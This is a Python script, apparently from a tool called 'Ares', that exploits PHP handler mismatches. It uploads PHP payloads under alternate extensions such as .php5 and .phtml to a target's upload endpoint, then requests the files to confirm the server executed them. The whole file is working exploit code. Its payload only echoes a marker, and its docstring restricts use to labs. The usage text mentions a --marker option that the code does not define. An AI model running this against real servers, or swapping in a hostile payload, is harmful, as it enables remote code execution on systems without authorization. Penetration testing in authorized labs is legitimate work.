#!/usr/bin/env python3
"""
verify_handler_mismatch.py — Verify PHP handler mismatch vulnerability.

Tests whether the target web server maps non-.php extensions (e.g., .php5, .phtml,
.php7, .shtml) to the PHP interpreter, enabling code execution through file uploads
that are accepted as "safe" but interpreted as PHP.

Authorized lab environments only. Never run against production systems.

Usage: python verify_handler_mismatch.py --target https://lab.internal/upload
       --webroot /var/www/html --marker <session_token>
"""
from __future__ import annotations

import argparse
import hashlib
import os
import sys
import time
import urllib.parse
import urllib.request

# PHP extensions often misconfigured in Apache/Nginx setups
CANDIDATE_EXTENSIONS = [
    ".php5", ".php7", ".phtml", ".pht", ".php3", ".php4",
    ".shtml", ".xhtml", ".cgi",
]

# Minimal PHP payload: echo a unique marker and exit — no persistence, no shell
_PAYLOAD_TEMPLATE = "<?php echo 'ARES_VERIFY_{marker}'; ?>"


def _fetch(url: str, timeout: int = 15) -> tuple[int, str]:
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "Ares/verify-handler-mismatch 1.0"},
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(4096).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as exc:
        return 0, str(exc)


def _make_marker() -> str:
    return hashlib.sha256(os.urandom(16)).hexdigest()[:16].upper()


def verify_handler_mismatch(
    upload_url: str,
    webroot_prefix: str,
    timeout: int = 15,
) -> dict:
    """
    Attempt to upload PHP payloads with alternate extensions and verify execution.

    Returns a result dict with keys: vulnerable, extension, marker, evidence.
    """
    marker = _make_marker()
    payload = _PAYLOAD_TEMPLATE.format(marker=marker).encode()
    expected = f"ARES_VERIFY_{marker}"

    results: list[dict] = []

    for ext in CANDIDATE_EXTENSIONS:
        filename = f"ares_probe_{marker}{ext}"
        # Multipart form upload
        boundary = f"AresBoundary{marker}"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + payload + f"\r\n--{boundary}--\r\n".encode()

        try:
            req = urllib.request.Request(
                upload_url,
                data=body,
                headers={
                    "Content-Type": f"multipart/form-data; boundary={boundary}",
                    "User-Agent": "Ares/verify-handler-mismatch 1.0",
                },
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                upload_status = resp.status
                upload_body = resp.read(4096).decode("utf-8", errors="replace")
        except Exception as exc:
            results.append({"extension": ext, "upload_error": str(exc)})
            continue

        # Probe the uploaded file
        probe_url = urllib.parse.urljoin(webroot_prefix.rstrip("/") + "/", filename)
        time.sleep(0.5)
        probe_status, probe_body = _fetch(probe_url, timeout)

        executed = expected in probe_body
        results.append({
            "extension": ext,
            "filename": filename,
            "upload_status": upload_status,
            "probe_url": probe_url,
            "probe_status": probe_status,
            "executed": executed,
            "evidence": probe_body[:200] if executed else "",
        })

        if executed:
            return {
                "vulnerable": True,
                "extension": ext,
                "marker": marker,
                "probe_url": probe_url,
                "evidence": probe_body[:500],
                "details": results,
            }

    return {
        "vulnerable": False,
        "marker": marker,
        "details": results,
        "note": "No alternate extension triggered PHP execution on this target",
    }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Verify PHP handler mismatch — lab environments only"
    )
    parser.add_argument("--target", required=True, help="Upload endpoint URL")
    parser.add_argument("--webroot", required=True, help="URL prefix where uploads are served")
    parser.add_argument("--timeout", type=int, default=15)
    args = parser.parse_args()

    print(f"[verify_handler_mismatch] target={args.target}", file=sys.stderr)
    result = verify_handler_mismatch(args.target, args.webroot, args.timeout)
    print(result["evidence"] if result["vulnerable"] else result["note"])
    import json
    print(json.dumps(result, indent=2))
    sys.exit(0 if result["vulnerable"] else 1)


if __name__ == "__main__":
    main()
